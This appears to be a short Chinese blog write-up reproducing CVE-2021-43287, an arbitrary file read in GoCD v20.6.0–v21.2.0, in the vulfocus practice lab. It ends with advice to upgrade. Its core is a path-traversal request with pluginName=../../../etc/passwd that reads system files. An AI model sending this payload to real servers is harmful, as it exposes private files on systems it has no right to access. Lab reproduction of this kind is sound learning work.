## **0x01** **前言:**

###
**今天来复现一个比较新的一个漏洞，今天下午在vulfocus靶场学习的时候看到出了一个新环境，是CVE-2021-43287，所以想着来复现一下，毕竟要时刻接收新消息和新知识嘛**

 **此处不做漏洞简介了，网上没找到具体原因和漏洞复现的文章。**

 **一枚正在学习的新人，希望多多关注，会给大家及时更新一些比较新的知识**

\--学为逆水行舟，不进则退

##  **0x02 影响版本:**

GoCD的v20.6.0 - v21.2.0

##  **0x03 漏洞复现**

###  **1.环境搭建**

在http://vulfocus.fofa.so/上启动环境(比较方便）

启动环境后，访问环境地址出现以下图片为搭建成功

![1640768567_61cc2437ebeeaeb7ca88d.png!small?1640768568705](https://image.3001.net/images/20211229/1640768567_61cc2437ebeeaeb7ca88d.png!small?1640768568705)

###  **2.使用bp抓包实现任意文件读取**

 **可以通过/go/addon/businesscontinuity/api/pluginfolderName=
&pluginName=../../../etc/passwd**

 **对文件进行读取**

如下图:![1640768860_61cc255c8d53215ce382d.png!small?1640768861414](https://image.3001.net/images/20211229/1640768860_61cc255c8d53215ce382d.png!small?1640768861414)

![1640768864_61cc2560de00196bc728a.png!small?1640768865590](https://image.3001.net/images/20211229/1640768864_61cc2560de00196bc728a.png!small?1640768865590)

##  **0x04 修复建议**

升级至安全版本GoCD21.3.0

下载地址为:https://www.onworks.net/zh-CN/software/app-gocd#google_vignette\

<https://gitee.com/mirrors/GoCD>

 **本文为原创文章，转载请标注明处**

